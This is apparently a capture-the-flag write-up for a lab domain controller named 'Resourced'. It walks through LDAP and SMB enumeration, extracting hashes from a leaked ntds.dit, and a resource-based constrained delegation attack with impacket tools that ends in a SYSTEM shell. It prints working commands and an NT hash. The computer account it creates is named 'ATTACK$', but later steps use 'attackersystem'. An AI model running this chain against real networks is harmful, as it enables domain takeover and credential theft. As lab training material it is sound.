# Resourced - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed the following open ports:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 17:16:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp+ open  msrpc         Microsoft Windows RPC
```

### Domain Information
From the scan results, I identified:
- Domain name: resourced.local
- NetBIOS Computer Name: RESOURCEDC
- DNS Computer Name: ResourceDC.resourced.local
- DNS Domain Name: resourced.local
- Product Version: 10.0.17763

## Gaining Initial Access

### LDAP Enumeration
I enumerated LDAP to discover more about the domain structure:
```bash
venv/bin/python3 windapsearch.py --dc-ip 192.168.145.175 --da --admin-objects --user-spns --gpos --full -PU -U
```

This query revealed credentials for user `V.Ventz`, providing initial access to the domain resources.

### SMB Enumeration
With these credentials, I was able to list and access SMB shares:
```bash
smbclient -L //192.168.145.175 -U V.Ventz
```

I discovered a "Password Audit" share containing critical files:
- ntds.dit (Active Directory database)
- SECURITY (Registry hive)
- SYSTEM (Registry hive)

## Lateral Movement

### Extracting Domain Hashes
I downloaded these files from the SMB share and used secretsdump.py to extract password hashes:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -security SECURITY -outputfile credentials.txt
```

After testing the extracted hashes, I identified two valid credentials:
- **Username**: V.Ventz
- **Hash**: [Hash value redacted]

- **Username**: L.Livingstone
- **Hash**: 19a3a7550ce8c505c2d46b5e39d6f808

### Privilege Enumeration
I used BloodHound to analyze the domain relationships and identify potential attack paths:
```bash
bloodhound-python -c All -u V.Ventz -p [password] -d resourced.local -dc ResourceDC.resourced.local
```

Analysis of the data revealed that user `L.Livingstone` had `GenericAll` permissions, which could be leveraged for privilege escalation.

## Privilege Escalation

### Resource-Based Constrained Delegation Attack
I exploited the `GenericAll` permissions held by L.Livingstone to perform a Resource-Based Constrained Delegation (RBCD) attack:

1. First, I added a new computer account to the domain:
```bash
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.145.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
```

2. Modified the delegation settings to allow impersonation:
```bash
rbcd.py -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$' -action 'write' 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
```

3. Verified the computer account was properly created:
```bash
get-adcomputer attackersystem
```

4. Requested a service ticket to impersonate the Administrator:
```bash
getST.py -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' 'resourced.local/attackersystem$:AttackerPC1!'
```

5. Used the ticket to establish an administrative connection:
```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.145.175
```

This provided a SYSTEM shell on the domain controller, successfully completing the challenge and giving full access to the target system.